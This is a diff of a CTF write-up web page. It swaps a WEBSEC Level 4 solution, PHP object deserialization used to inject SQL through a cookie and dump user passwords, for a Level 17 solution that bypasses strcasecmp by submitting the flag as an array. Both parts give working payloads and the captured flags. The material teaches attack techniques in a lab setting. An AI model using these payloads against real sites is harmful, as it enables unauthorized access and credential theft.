@@ -76,38 +76,44 @@
         
   <section class="container centered">
   <div class="error">
-   <h1 id="websec-level-4">WEBSEC Level 4</h1><br><br>
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   <h1 id="websec-level-17">WEBSEC Level 17</h1>
 <h3 id="challenge-description">Challenge description</h3>
-<p>Serialization is a pain!</p><br>
+<p>I was told that guessing is fun.</p>
 <h3 id="initial-analysis">Initial analysis</h3>
-<p><code>$sql->query = 'SELECT username FROM users WHERE id=';  //query
-
-
-if (isset ($_COOKIE['leet_hax0r'])) {
-    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));   //deserialization vuln
-else  $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
-
-class SQL {
-    public $query = '';
-    public $conn;
-    public function __construct() {      //class
-    }</code></p><br>
-<h3 id="tldr">tl;dr</h3>
-<p>STEP 1: <?php class SQL { public $query = `'SELECT sql as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:41:&quot;SELECT sql as username FROM sqlite_master&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</code></p><p> OUTPUT: Username: CREATE TABLE users(id int, username varchar, password varchar)</p>
-<p>STEP 3: <?php class SQL { public $query = `'SELECT password as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:38:&quot;SELECT password as username FROM users&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</code></p>
-<p></p><p>OUTPUT: Username: WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</p><br>
+<p><code>if (! strcasecmp ($_POST['flag'], $flag))                echo '&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;' . $flag . '&lt;/mark&gt;.&lt;/div&gt;';</code></p>
+<h3 id="walk-through">Walk through</h3>
+<p>&quot;The strcasecmp() function will return 0 if any of the parameters is an array&quot;</p>
+<p>STEP 1: Intercept in Burp Suite</p>
+<p>STEP 2: flag=sometext&amp;submit=Go OUTPUT: Invalid flag, sorry.</p>
+<p>STEP 3: flag[]=sometext&amp;submit=Go OUTPUT: WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}</p>
+<p>REFERENCE: https://eatingrsa.wordpress.com/tag/login-bypass/</p>
 <h3 id="flag">Flag</h3>
-<p><strong>FLAG</strong>: <code>WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</code></p>
+<p><strong>FLAG</strong>: <code>WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}</code></p>
 <p>For further queries, please DM me on Twitter: <a href="https://twitter.com/m0n574">https://twitter.com/m0n574</a>.</p>
-
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
 
   </div>
 </section>
